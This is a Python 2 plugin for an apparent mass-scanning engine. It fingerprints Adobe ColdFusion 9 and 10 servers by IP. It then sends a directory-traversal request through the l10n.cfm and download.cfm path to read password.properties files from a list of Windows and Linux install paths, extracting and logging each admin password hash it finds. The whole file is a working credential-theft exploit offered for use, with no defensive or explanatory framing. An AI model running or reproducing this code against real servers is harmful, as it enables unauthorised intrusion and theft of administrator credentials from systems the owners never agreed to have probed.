# -*- coding: gb2312 -*-
from task import *
import socket, struct, time
import urllib2, re

def request_cf_file(protocal, host, filename):
    vul_url = "%s://%s/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/mail/download.cfm&filename=%s&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"

    try:
        #print vul_url % (protocal, host, filename)

        request = urllib2.Request(vul_url % (protocal, host, filename))  
        request.add_header('User-Agent', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1')
    
        #response = urllib2.urlopen(vul_url % (protocal, host, filename))
        response = urllib2.urlopen(request)
        
        return response.read()
    except:
        pass    
    return None

def detect_cf_pwd(host):
    headers = {"Content-type": "application/x-www-form-urlencoded",
               "Accept": "text/plain"}
    
    urllib2.socket.setdefaulttimeout(6)
    
    protocals = ("http", "https")
    
    pwd_path_list = (("win", 9, "ColdFusion9\lib\password.properties"),
                     ("win", 9, "ColdFusion9\cfusion\lib\password.properties"),
                     ("win", 10, "ColdFusion10\lib\password.properties"),
                     ("win", 10, "ColdFusion10\cfusion\lib\password.properties"),
                     ("win", None, "..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties"),
                     ("lnx", 9, "opt/coldfusion9/lib/password.properties"),
                     ("lnx", 9, "opt/coldfusion9/cfusion/lib/password.properties"),
                     ("lnx", 10, "opt/coldfusion10/lib/password.properties"),
                     ("lnx", 10, "opt/coldfusion10/cfusion/lib/password.properties"),
                     ("lnx", None, "opt/coldfusion/cfusion/lib/password.properties"))
    
    trav = "../../../../../../../../../"
    
    cf_srv_info = None
    
    for protocal in protocals:
        try:
            url = "%s://%s/CFIDE/administrator/index.cfm" % (protocal, host)
            response = urllib2.urlopen(url)
            if response.code != 200:
                continue;
            print "CF SRV OPEN"
            http_headers = response.info()
            if http_headers.has_key('Server'):
                server_info = http_headers['Server']
            else:
                server_info = ""
                
            page = response.read()
            if "1995-2009 Adobe Systems" in page or "1995-2010 Adobe Systems" in page:
                ver = 9
            elif "1997-2012 Adobe Systems" in page:
                ver = 10
            else:
                ver = None
                
            if "IIS" in server_info or "Windows" in server_info:
                os = "win"
            elif "Apache/" in server_info:
                os = "lnx"
            else:
                os = None
                
            cf_srv_info = (url, ver, server_info)
            
            for _os, _ver, _path in pwd_path_list:
                if _os == os or not os:
                    if _ver == ver or not ver or not _ver:
                        trav_path = trav + _path
                        if _os == 'win':
                            trav_path = trav_path.replace('/', '\\')
                        
                        response = request_cf_file(protocal, host, trav_path)
                        if response:                            
                            match = re.search("password\s*=\s*(\w+)\s", response)
                            if match:
                                return (cf_srv_info, match.group(1))
                            else:
                                return (cf_srv_info, response)
        except:
            pass
    
    if cf_srv_info:
        return (cf_srv_info, None)
    
    return None

class port_plugin(engine_plugin):
    def __init__(self, name):
        engine_plugin.__init__(self, name)
        #self.max_process = 20
        
    def handle_task(self, task_info):
        ip =  socket.inet_ntoa(struct.pack("L", socket.htonl(task_info['work'])))
        print "handle_task: %s\r" % ip,
        '''
        self.log(task_info, "handle_task: %s process:%d" %  (ip, task_info['process']))
        for port in self.get_cfg_vaule(task_info, "ports").split(" "):
            try:
                sock = socket.create_connection((ip, int(port)), 1)
                if sock:
                    self.log(task_info, "handle_task: %s %d open!" % (ip, int(port)))
                    sock.close()
            except:
                pass
        '''
        cf_info = detect_cf_pwd(ip)
        if cf_info:
            (url, ver, server_info), pass_hash = cf_info
            print "%s SUCCESS" % url
            self.log(task_info, "%s\t%s\t%s" % (url, server_info, pass_hash))
            
def init_plugin(name):
    return port_plugin(name)

    
        

    
